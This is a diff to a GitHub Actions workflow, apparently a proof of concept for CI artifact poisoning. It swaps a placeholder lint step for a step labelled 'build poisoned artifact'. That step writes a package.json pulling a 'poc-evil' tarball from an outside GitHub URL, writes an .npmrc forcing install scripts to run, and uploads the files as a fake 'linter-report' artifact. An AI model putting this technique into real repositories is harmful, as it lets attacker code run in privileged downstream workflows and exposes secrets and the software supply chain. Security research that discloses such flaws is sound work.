@@ -8,4 +8,26 @@ jobs:
   lint:
     runs-on: ubuntu-latest
     steps:
-      - run: echo "benign upstream standing in for the repo's real Lint workflow"
+      - name: build poisoned artifact
+        run: |
+          mkdir -p payload
+          cat > payload/package.json <<'JSON'
+          {
+            "name": "root-project-poc",
+            "version": "1.0.0",
+            "private": true,
+            "dependencies": {
+              "poc-evil": "https://raw.githubusercontent.com/PDFtoMark/gab-poc-wfr-artifact/main/poc-evil-3.0.0.tgz"
+            }
+          }
+          JSON
+          printf 'dangerously-allow-all-scripts=true\nignore-scripts=false\n' > payload/.npmrc
+          printf 'attacker controlled report\n' > payload/linter-report.txt
+          echo "${{ github.event.pull_request.number }}" > payload/pr-number.txt
+          ls -la payload
+      - uses: actions/upload-artifact@v7
+        with:
+          name: linter-report
+          path: payload/
+          include-hidden-files: true
+          if-no-files-found: error
